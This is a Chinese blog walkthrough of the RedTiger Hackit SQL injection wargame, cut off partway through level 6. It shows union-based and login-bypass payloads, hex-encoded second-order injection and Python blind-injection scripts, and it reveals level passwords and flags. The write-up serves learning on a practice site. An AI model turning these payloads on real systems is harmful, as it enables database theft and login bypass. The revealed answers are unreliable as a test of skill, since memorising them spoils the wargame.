
 <!DOCTYPE HTML>
<html lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
  
    <title>RedTiger&#39;s Hackit writeup | TO DO</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="Max">
    

    
    <meta name="description" content="网上很多关于RedTiger的writeup已失效，所以重新整理下，算是小白入门。">
<meta name="keywords" content="sql注入">
<meta property="og:type" content="article">
<meta property="og:title" content="RedTiger&#39;s Hackit writeup">
<meta property="og:url" content="http://juniorprincewang.github.io/2018/04/04/RedTiger-s-Hackit-writeup/index.html">
<meta property="og:site_name" content="TO DO">
<meta property="og:description" content="网上很多关于RedTiger的writeup已失效，所以重新整理下，算是小白入门。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2019-06-12T06:41:26.225Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="RedTiger&#39;s Hackit writeup">
<meta name="twitter:description" content="网上很多关于RedTiger的writeup已失效，所以重新整理下，算是小白入门。">

    
    <link rel="alternative" href="/atom.xml" title="TO DO" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    <link rel="stylesheet" href="/css/style.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>
</html>
  <body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header>
      
<div>
		
			<div id="imglogo">
				<a href="/"><img src="/img/logo.png" alt="TO DO" title="TO DO"></a>
			</div>
			
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="TO DO">TO DO</a></h1>
				<h2 class="blog-motto">吾尝终日而思矣，不如须臾之所学也。</h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
					<li>
 					
					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search">
						<input type="hidden" name="q" value="site:juniorprincewang.github.io">
					</form>
					
					</li>
				</ul>
			</ul></nav>			
</div>
    </header>
    <div id="container">
      <div id="main" class="post" itemscope itemprop="blogPost">
  
	<article itemprop="articleBody"> 
		<header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2018/04/04/RedTiger-s-Hackit-writeup/" title="RedTiger&#39;s Hackit writeup" itemprop="url">RedTiger&#39;s Hackit writeup</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="Max" target="_blank" itemprop="author">Max</a>
		
  </p><p class="article-time">
    <time datetime="2018-04-04T00:52:34.000Z" itemprop="datePublished"> Published 2018-04-04</time>
    
  </p>
</header>
	<div class="article-content">
		
		<div id="toc" class="toc-article">
			<strong class="toc-title">Contents</strong>
		
			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RedTiger"><span class="toc-number">1.</span> <span class="toc-text">RedTiger</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#level1"><span class="toc-number">1.1.</span> <span class="toc-text">level1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2"><span class="toc-number">1.2.</span> <span class="toc-text">level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3"><span class="toc-number">1.3.</span> <span class="toc-text">level3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level4"><span class="toc-number">1.4.</span> <span class="toc-text">level4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level5"><span class="toc-number">1.5.</span> <span class="toc-text">level5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-6"><span class="toc-number">1.6.</span> <span class="toc-text">level 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-7"><span class="toc-number">1.7.</span> <span class="toc-text">level 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-8"><span class="toc-number">1.8.</span> <span class="toc-text">level 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-9"><span class="toc-number">1.9.</span> <span class="toc-text">level 9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-10"><span class="toc-number">1.10.</span> <span class="toc-text">level 10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考网站"><span class="toc-number">1.11.</span> <span class="toc-text">参考网站</span></a></li></ol></li></ol>
		
		</div>
		
		<p>网上很多关于RedTiger的writeup已失效，所以重新整理下，算是小白入门。</p>
<a id="more"></a>

<h1 id="RedTiger"><a href="#RedTiger" class="headerlink" title="RedTiger"></a><a href="http://redtiger.labs.overthewire.org" target="_blank" rel="noopener">RedTiger</a></h1><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>点击Category：1后，网址以GET方式传递<code>cat</code>参数。</p>
<ul>
<li><p>利用<code>and 1=1</code>,<code>and 1=2</code>进行判断是否存在注入点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 正常 </span><br><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 and 1=1 </span><br><span class="line"># 运行异常</span><br><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 and 1=2</span><br></pre></td></tr></table></figure>
</li>
<li><p>存在数字型注入，利用order by 测试出存在4个列： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 正常 </span><br><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 order by 4 </span><br><span class="line"># 运行异常</span><br><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 order by 5</span><br></pre></td></tr></table></figure>
</li>
<li><p>构造union联合查询语句，找回显： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,4</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>发现3,4 处存在回显。</p>
<p>我这里继续爆库、爆表、爆字段等操作，发现异常。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,version(), database()</span><br></pre></td></tr></table></figure>

<p>回显</p>
<pre><code>5.5.57-0+deb8u1
hackit</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&apos;level1_users&apos;</span><br></pre></td></tr></table></figure>

<p>回显</p>
<pre><code>Some things are disabled!!!</code></pre><p>所以无法找出<code>level1_users</code>的字段了吗？<br>当然不是，点击登录按钮，在浏览器调试窗口（火狐的firebug或者F12）仔细看发送请求包，可知数据是POST发送的，字段为</p>
<pre><code>查询字符串
    cat:1
表单数据
    user:
    password:
    login:login</code></pre><p>开始试了试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,user,password from level1_users</span><br></pre></td></tr></table></figure>

<p>结果不对，而我观察到页面中给出的是<code>username</code>，所以换成它。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,username,password from level1_users</span><br></pre></td></tr></table></figure>

<p>got it.拿到用户名密码后登录即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hornoxe</span><br><span class="line">thatwaseasy</span><br></pre></td></tr></table></figure>

<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://redtiger.labs.overthewire.org/level2.php&quot; -H &quot;Cookie: level2login=4_is_not_random&quot;</span><br></pre></td></tr></table></figure>

<p>首先点击登陆按钮，抓取登陆数据包。有如下字段</p>
<pre><code>username=admin&amp;password=admin&amp;login=Login</code></pre><p>先对<code>username</code>进行注入点测试，并尝试万能用户名。无果而返。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;</span><br><span class="line">admin&apos; --+</span><br><span class="line">admin&apos; #</span><br><span class="line">admin&apos;/*</span><br><span class="line">admin&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">admin&apos; or &apos;1&apos;=&apos;1%23</span><br><span class="line">admin&apos;)or(&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>

<p>接着对password测试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;</span><br></pre></td></tr></table></figure>

<p>但是得到的返回信息为：</p>
<pre><code>&lt;b&gt;Warning&lt;/b&gt;:  mysql_num_rows() expects parameter 1 to be resource, boolean given in &lt;b&gt;/var/www/html/    hackit/level2.php&lt;/b&gt; on line &lt;b&gt;48&lt;/b&gt;&lt;br /&gt;
Login incorrect!</code></pre><p>说明存在字符型注入点。这就好办了。直接上sql万能密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">&apos; or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>

<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://redtiger.labs.overthewire.org/level3.php&quot; -H &quot;Cookie: level3login=feed_your_cat_before_your_cat_feeds_you&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Admin&apos;</span><br><span class="line">MDQyMjExMDE0MTgyMTQwMTc0</span><br><span class="line">Admin&apos; and &apos;1&apos;=&apos;2</span><br><span class="line">MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg5MjA0MTAxMjUzMjE5MDI0MjMyMDY2MDY2MjM3</span><br><span class="line">Admin&apos; and &apos;1&apos;=&apos;1</span><br><span class="line">MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg5MjA0MTAxMjUzMjE5MDI0MjMyMDY2MDY2MjM4</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Admin&apos; order by 8#</span><br><span class="line">MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMxMDY2 # 报错</span><br><span class="line">Admin&apos; order by 7#</span><br><span class="line">MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMyMDY2 # 不报错</span><br></pre></td></tr></table></figure>

<p>显示位还显示的Admin的信息，那找个数据库中没有的显示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Admin&apos; union select 1,2,3,4,5,6,7#</span><br><span class="line">MDQyMjExMDE0MTgyMTQwMTc0MjIzMDc3MjA0MTA0MTc4MTQ2MDA5MTg4MDI2MDA5MTg2MDAyMjMzMDc0MDYwMTk5MjM3MjE5MDg3MjQ2MTU0MjA4MTc2MDk2MTMxMjIwMDUxMDU5</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">max&apos; union select 1,2,3,4,5,6,7#</span><br><span class="line">MDA2MjE0MDI3MjQ4MTk0MjUyMTQ1MDgxMjA1MTExMjUzMTQzMDc2MTYzMDI2MDA2MTcxMDY1MTcyMDcwMDYzMTk5MjM2MjE5MDgwMjQ2MTU1MjA4MTc5MDk2MTMwMjEx</span><br></pre></td></tr></table></figure>

<p>得到的回显位为：2,4,5,6,7。</p>
<pre><code>Show userdetails: &lt;br&gt;
                &lt;table style=&quot;border-collapse:collapse; border:1px solid black;&quot;&gt;
                    &lt;tr&gt;
                        &lt;td&gt;Username: &lt;/td&gt;
                        &lt;td&gt;2&lt;/td&gt;
                    &lt;/tr&gt;
                    &lt;tr&gt;
                        &lt;td&gt;First name: &lt;/td&gt;
                        &lt;td&gt;6&lt;/td&gt;
                    &lt;/tr&gt;
                    &lt;tr&gt;
                        &lt;td&gt;Name: &lt;/td&gt;
                        &lt;td&gt;7&lt;/td&gt;
                    &lt;/tr&gt;
                    &lt;tr&gt;
                        &lt;td&gt;ICQ: &lt;/td&gt;
                        &lt;td&gt;5&lt;/td&gt;
                    &lt;/tr&gt;
                    &lt;tr&gt;
                        &lt;td&gt;Email: &lt;/td&gt;
                        &lt;td&gt;4&lt;/td&gt;
                    &lt;/tr&gt;
                &lt;/table&gt;    
            &lt;br&gt;&lt;br&gt;&lt;br&gt;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># max&apos; union select 1,2,3,4,5,6,(column_name) from information_schema.columns where table_name=&apos;level3_users&apos; limit 0,1#</span><br><span class="line">MDA2MjE0MDI3MjQ4MTk0MjUyMTQ1MDgxMjA1MTExMjUzMTQzMDc2MTYzMDI2MDA2MTcxMDY1MTcyMDcwMDYzMTk5MjM2MjE5MDgwMjQ2MTU1MjA4MTc5MDk2MTU3MTQ3MTA3MTE2MTY1MTM5MjA0MTQ0MTEyMDM3MTg5MTUzMTA0MjE4MTcwMTc4MDE1MTk4MDAyMTUxMTIwMDg2MTMzMTMyMDY5MDQ3MTY0MTkwMDM3MDU2MTI0MTQwMDM2MDc5MTI1MTIyMTExMTQ5MTMyMDY2MTQ3MjA1MDcxMDQ3MTkzMjE0MTE3MTIzMTk5MDg3MTE5MTUzMDMzMTU3MjA1MDE3MDQ3MjIzMDU4MjQ0MTg3MDI5MTY4MDU4MjA0MjAzMDY2MjAyMDA1MDQ3MTMxMDI4MTY3MDk4MjE2MjQ0MjE3MTQwMjQ2MjAxMTg4MTk3MDQ2MDA3MTUzMDM3MTQ4MjA4</span><br></pre></td></tr></table></figure>

<p>尝试暴列名出错。</p>
<pre><code>Show userdetails: &lt;br&gt;Some things are disabled!!!</code></pre><p>还好知道字段，<code>password</code>，直接泄露即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># max&apos; union select 1,2,3,4,5,6,password from level3_users where username=&apos;Admin&apos;#</span><br><span class="line">MDA2MjE0MDI3MjQ4MTk0MjUyMTQ1MDgxMjA1MTExMjUzMTQzMDc2MTYzMDI2MDA2MTcxMDY1MTcyMDcwMDYzMTk5MjM2MjE5MDgwMjQ2MTU1MjA4MTc5MDk2MTk3MTQ1MTE5MTA3MTY3MTM3MjA4MTcxMDYyMDM0MTYyMTQ3MDQ0MjE4MTYwMTY1MDIyMjA2MDc4MjA1MDczMDY5MTUzMTQ3MDkwMDYxMjQwMTYwMDM0MDUxMDgxMTU0MTAzMDgyMTA3MTE0MTI0MjEzMTM0MDY0MTU0MTMzMDEzMDAwMjE0MTU1MTA3MTI1MTMzMDA2</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">thisisaverysecurepasswordEEE5rt</span><br></pre></td></tr></table></figure>

<p>代码可以写作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$payload2 =&quot;max&apos; union select 1,2,3,4,5,6,password from level3_users where username=&apos;Admin&apos;#&quot;;</span><br><span class="line">print_r($payload2);</span><br><span class="line">print &apos;&lt;br&gt;&apos;;</span><br><span class="line">$en_payload = encrypt($payload2);</span><br><span class="line">print_r($en_payload);</span><br><span class="line">print &apos;&lt;br&gt;&apos;;</span><br></pre></td></tr></table></figure>

<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>网站</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://redtiger.labs.overthewire.org/level4.php&quot; -H &quot;Cookie: level4login=there_is_no_bug&quot;</span><br></pre></td></tr></table></figure>

<pre><code>Welcome to Level 4

Target: Get the value of the first entry in table level4_secret in column keyword
Disabled: like</code></pre><p>从<code>table_leel4</code>表中的<code>keyword</code>列得到第一个值。<br>这道题的提示是盲注。<br>点击<code>Click me</code>，得到带有<code>?id=1</code>的新链接<code>https://redtiger.labs.overthewire.org/level4.php?id=1</code>。</p>
<p>正常页面显示<code>Query returned 1 rows.</code>。
注入<code>&#39;</code>，新页面显示<code>Query returned 0 rows.</code>。说明这是错误结果。</p>
<p>利用<code>布尔盲注</code>，通过返回页面中<code>Query returned 1 rows.</code>的结果来筛选出目标结果。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select ascii(substr(keyword,1,1)) from level4_secret limit 0,1)&lt;&#123;1&#125;</span><br></pre></td></tr></table></figure>

<p>利用脚本来进行盲注很easy。但是需要提前把SQL语句测试准确，以免带来额外的调试。</p>
<p>先获取值的长度，再逐个获取字符。这里采用折半搜索。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url_length=&quot;http://redtiger.labs.overthewire.org/level4.php?id=1 and (select length(keyword) from level4_secret limit 0,1)&lt;&#123;0&#125;&quot;</span><br><span class="line"></span><br><span class="line">cookies=&#123;&quot;level2login&quot;:&quot;4_is_not_random&quot;,</span><br><span class="line">         &quot;level3login&quot;:&quot;feed_your_cat_before_your_cat_feeds_you&quot;,</span><br><span class="line">         &quot;level4login&quot;:&quot;there_is_no_bug&quot;</span><br><span class="line">        &#125;</span><br><span class="line">h=50</span><br><span class="line">l=1</span><br><span class="line">length=(l+h)/2</span><br><span class="line">while l &lt;= h:</span><br><span class="line">    url = url_length.format(length)</span><br><span class="line">    resp=requests.get(url, cookies=cookies)</span><br><span class="line">    if resp.status_code != 200:</span><br><span class="line">        print &quot;status code error &quot;</span><br><span class="line">    text = resp.content</span><br><span class="line">    if text.find(&apos;Query returned 1 rows.&apos;) != -1: </span><br><span class="line">        h = length-1</span><br><span class="line">    else:</span><br><span class="line">        l = length+1</span><br><span class="line">    length =(h+l)/2</span><br><span class="line"></span><br><span class="line">print &apos;length = &apos;, length</span><br></pre></td></tr></table></figure>

<p>再进行逐个字符测试。<br>需要牢记的是ASCII字符集由95个可打印字符（<strong>0x20-0x7E</strong>）和33个控制字符（<strong>0x00-0x19，0x7F</strong>）组成。<br>由于采取了折半搜索，需要根据返回结果来判断，得到的字符是否需要+1。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url_format=&quot;http://redtiger.labs.overthewire.org/level4.php?id=1 and (select ascii(substr(keyword,&#123;0&#125;,1)) from level4_secret limit 0,1)&gt;&#123;1&#125;&quot;</span><br><span class="line"></span><br><span class="line">cookies=&#123;&quot;level2login&quot;:&quot;4_is_not_random&quot;,</span><br><span class="line">         &quot;level3login&quot;:&quot;feed_your_cat_before_your_cat_feeds_you&quot;,</span><br><span class="line">         &quot;level4login&quot;:&quot;there_is_no_bug&quot;</span><br><span class="line">        &#125;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">for i in range(1, 21+1):</span><br><span class="line">    print &quot;%d th round&quot;%(i)</span><br><span class="line">    h= 0x7E</span><br><span class="line">    l= 0x20</span><br><span class="line">    flag=0</span><br><span class="line">    while l &lt;= h:</span><br><span class="line">        c=(l+h)/2</span><br><span class="line">        #print &apos;h=&apos;, chr(h)</span><br><span class="line">        #print &apos;l=&apos;, chr(l)</span><br><span class="line">        #print &apos;c=%d&apos;%c</span><br><span class="line">        url = url_format.format(i,c)</span><br><span class="line">        #print url</span><br><span class="line">        resp=requests.get(url, cookies=cookies)</span><br><span class="line">        if resp.status_code != 200:</span><br><span class="line">            print &quot;status code error &quot;</span><br><span class="line">        text = resp.content</span><br><span class="line">        #print text</span><br><span class="line">        if text.find(&apos;Query returned 1 rows.&apos;) == -1:</span><br><span class="line">            h = c-1</span><br><span class="line">            flag=0</span><br><span class="line">        else:</span><br><span class="line">            l = c+1</span><br><span class="line">            flag=1</span><br><span class="line">    print &apos;c=&apos;,c,&apos; flag=&apos;, flag</span><br><span class="line">    if flag:</span><br><span class="line">        c+=1</span><br><span class="line">    print &apos;found c = &apos;, chr(c)</span><br><span class="line">    result+=chr(c)</span><br><span class="line"></span><br><span class="line">print &apos;result = &apos;, result</span><br></pre></td></tr></table></figure>

<p>还有python 提供了字符集，不用这么麻烦自己考虑了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; help(string)</span><br><span class="line"></span><br><span class="line">DATA</span><br><span class="line">    ascii_letters = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;</span><br><span class="line">    ascii_lowercase = &apos;abcdefghijklmnopqrstuvwxyz&apos;</span><br><span class="line">    ascii_uppercase = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;</span><br><span class="line">    digits = &apos;0123456789&apos;</span><br><span class="line">    hexdigits = &apos;0123456789abcdefABCDEF&apos;</span><br><span class="line">    letters = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&apos;</span><br><span class="line">    lowercase = &apos;abcdefghijklmnopqrstuvwxyz&apos;</span><br><span class="line">    octdigits = &apos;01234567&apos;</span><br><span class="line">    printable = &apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTU...</span><br><span class="line">    punctuation = &apos;!&quot;#$%&amp;\&apos;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&apos;</span><br><span class="line">    uppercase = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;</span><br><span class="line">    whitespace = &apos;\t\n\x0b\x0c\r &apos;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>You can raise your wechall.net score with this flag: e8bcb79c389f5e295bac81fda9fd7cfa<br>The password for the next level is: there_is_a_truck</p>
</blockquote>
<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><blockquote>
<p>Target: Bypass the login<br>Disabled: substring , substr, ( , ), mid<br>Hints: its not a blind, the password is md5-crypted, watch the login errors</p>
</blockquote>
<p>不能进行盲注。那就先输入<code>admin</code>用户和随便一个密码，显示</p>
<blockquote>
<p>Some things are disabled!!</p>
</blockquote>
<p>看来<code>admin</code>这个词给过滤掉了。</p>
<p>然后测试 <code>username</code> 是否存在注入点，输入<code>&#39;</code>。</p>
<blockquote>
<p>Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/html/hackit/level5.php on line 46<br>User not found!</p>
</blockquote>
<p>很好，然后熟练得测试出回显字段，得到2个回显字段。<code>&#39; union select 1,2#</code>。这时显示的错误为 </p>
<blockquote>
<p>Login failed!
说明我们绕过了 <code>username</code> ，接下来对 <code>password</code> 进行测试。</p>
</blockquote>
<p>题目说 <code>password</code> 经过了 md5 加密，而且还过滤了 <code>(</code> 与 <code>)</code> 两个字符。 因此将 <code>password</code> 值为1，并对字符串’1’ 进行md5加密，MD5(‘1’)=’c4ca4238a0b923820dcc509a6f75849b’。<br>测试到底是 select 的1位置用md5加密还是2位置用md5加密。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username= &apos; union select 1,&apos;c4ca4238a0b923820dcc509a6f75849b&apos;#</span><br><span class="line">password=1</span><br></pre></td></tr></table></figure>

<p>可以得到结果</p>
<blockquote>
<p>You can raise your wechall.net score with this flag: ca5c3c4f0bc85af1392aef35fc1d09b3<br>The password for the next level is: for_more_bugs_update_to_php7</p>
</blockquote>
<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &apos;http://redtiger.labs.overthewire.org/level6.php?user=1&apos; -H &apos;Cookie:  level6login=for_more_bugs_update_to_php7&apos;</span><br></pre></td></tr></table></figure>

<p>可以用常规注入对url参数 <code>user=1</code>进行注入测试。但是测试回显字段时，未回显。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,2,3,4,5%23</span><br></pre></td></tr></table></figure>

<p>报错</p>
<pre><code>User not found
Login failed! </code></pre><p>而得到user的username为 <code>deddlef</code> 。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,2,3,4,5%23</span><br></pre></td></tr></table></figure>


<pre><code>Username:     deddlef
Email:     dumbi@damibi.de</code></pre><p>可以用 <code>&#39;deddlef&#39;</code> 替换 <code>union select 1,2,3,4,5%23</code> 中的各个回显位置。还是报错。服务器应该过滤了 <code>&#39;</code>。
用16进制 <code>0x646564646c6566</code> 继续替换查找，当替换 <code>2</code> 时，得到正确的回显结果。<br>那么可以怀疑后台先根据 <code>id</code> 查找 <code>username</code>，再根据 <code>username</code> 再次去查找 user信息的，我们可以利用 第二个回显位置进行进一步注入测试，但是要用16进制表示。<br><strong>二次注入</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 测试回显数量，仍然是5个位置。</span><br><span class="line"># &apos; order by 5# =&gt; 0x27206f72646572206279203523</span><br><span class="line">http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,0x27206f72646572206279203523,3,4,5%23</span><br><span class="line"># &apos; order by 6# =&gt; 0x27206f72646572206279203623</span><br><span class="line">http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,0x27206f72646572206279203623,3,4,5%23</span><br></pre></td></tr></table></figure>

<p>测试回显位：</p>
